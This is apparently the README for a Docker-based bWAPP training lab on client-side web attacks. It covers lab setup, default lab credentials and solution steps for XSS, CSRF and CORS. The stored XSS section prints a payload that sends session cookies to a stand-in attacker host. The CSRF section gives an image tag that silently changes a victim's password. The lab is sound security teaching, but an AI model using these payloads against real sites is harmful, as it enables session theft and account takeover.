# bWAPP: Client-Side Attacks (XSS, CSRF, CORS, WebSockets)

## Overview

bWAPP (buggy Web Application) is a deliberately vulnerable web application for security testing and training. This lab focuses on client-side vulnerabilities including Reflected, Stored, and DOM Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and Cross-Origin Resource Sharing (CORS) misconfigurations.

- **Default Port / Access**: `http://localhost:8085`
- **Container Name**: `cyberlab_02_bwapp`
- **Directory**: `Classes/02_web_penetration_tester/12_13_14_15_client_side_attacks/bwapp`

---

## Upstream Sources

- **Official Website**: [bWAPP / ITsecGames](http://www.itsecgames.com/)
- **Docker Hub Image**: [raesene/bwapp](https://hub.docker.com/r/raesene/bwapp)

---

## Setup & Database Initialization

1. Start the container:
   ```bash
   docker compose up -d
   ```
2. Initialize or reset the database by opening:
   - Web UI: Navigate to `http://localhost:8085/install.php` and click the "here" link to install the database.
   - CLI / Direct URL: `http://localhost:8085/install.php?install=yes`
3. Access the login page at `http://localhost:8085/login.php` with default credentials:
   - **Username**: `bee`
   - **Password**: `bug`
   - **Default Security Level**: `low` (can be configured in user preferences or on login)

---

## How to Solve & Practice

### 1. Reflected XSS (GET)

- Navigate to the **Cross-Site Scripting - Reflected (GET)** module (`xss_get.php`).
- Submit a test payload in the input field:
  ```html
  <script>
    alert(document.cookie);
  </script>
  ```
- Alternatively verify via curl / browser:
  ```bash
  curl -s "http://localhost:8085/xss_get.php?firstname=%3Cscript%3Ealert(1)%3C/script%3E&lastname=test&form=submit"
  ```
- Observe how the unescaped user input reflects directly back into the DOM response.

### 2. Stored XSS

- Navigate to the **Cross-Site Scripting - Stored (Blog)** module (`xss_stored_1.php`).
- Inject a persistent script payload into the comment field:
  ```html
  <script>
    fetch(
      "http://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie),
    );
  </script>
  ```
- Any user visiting or refreshing the blog will execute the injected payload in their browser context.

### 3. Cross-Site Request Forgery (CSRF)

- Navigate to the **Cross-Site Request Forgery (Change Password)** module (`csrf_1.php`).
- Analyze the password change request:
  ```
  GET /csrf_1.php?password_new=hacked&password_conf=hacked&action=change HTTP/1.1
  ```
- Construct an external PoC page that triggers the action automatically if an authenticated victim visits:
  ```html
  <img
    src="http://localhost:8085/csrf_1.php?password_new=attackerpass&password_conf=attackerpass&action=change"
  />
  ```
- Observe password modification without anti-CSRF token validation on the `low` security level.

### 4. CORS Misconfiguration

- Inspect endpoints returning sensitive user data with permissive headers (such as `Access-Control-Allow-Origin: *` with credentials enabled).
- Write a malicious origin script to read cross-origin responses using `XMLHttpRequest` or `fetch` with `credentials: 'include'`.

---

## Verification Steps

To verify the health and functionality of the lab:

```bash
# 1. Validate Docker Compose syntax
docker compose config -q

# 2. Start container
docker compose up -d

# 3. Verify HTTP 200 response on login page
curl -i http://localhost:8085/login.php

# 4. Initialize database via installation endpoint
curl -i "http://localhost:8085/install.php?install=yes"
```

---

## YouTube Walkthroughs & Solving Guides

- [PwnFunction - Cross-Site Request Forgery (CSRF) Explained](https://www.youtube.com/watch?v=eWEgUcHPle0)
- [The Cyber Mentor - Web Application Penetration Testing Course](https://www.youtube.com/watch?v=X4eRbHgRawI)
- [Rana Khalil - Cross-Origin Resource Sharing (CORS) Complete Guide](https://www.youtube.com/watch?v=t5FBwq-kudw)

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Check status
./lab status

# Stop this lab
docker compose down
```
